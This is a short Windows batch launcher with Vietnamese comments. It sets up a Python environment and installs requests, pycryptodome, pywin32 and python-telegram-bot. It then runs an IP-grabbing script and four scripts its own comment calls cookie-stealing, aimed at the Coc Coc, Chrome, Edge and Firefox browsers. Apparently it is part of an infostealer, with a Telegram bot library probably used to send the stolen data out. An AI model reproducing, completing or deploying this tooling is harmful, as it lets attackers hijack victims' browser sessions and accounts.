@echo off

REM Kiểm tra và cài đặt Python nếu chưa có
where python >nul 2>nul
IF %ERRORLEVEL% NEQ 0 (
    echo Python không được cài đặt. Vui lòng cài đặt Python và chạy lại script.
    pause
    exit /b
)

REM Tạo môi trường ảo
python -m venv venv

REM Kích hoạt môi trường ảo
call venv\Scripts\activate

REM Cài đặt các thư viện cần thiết
pip install requests pycryptodome pywin32 python-telegram-bot

REM Chạy script lấy địa chỉ IP
python getip.py

REM Chạy script đánh cắp cookies
python scancoccoccookie.py
python scanchromecookie.py
python scanedgecookie.py
python scanfirefoxcookie.py

REM Kết thúc
exit
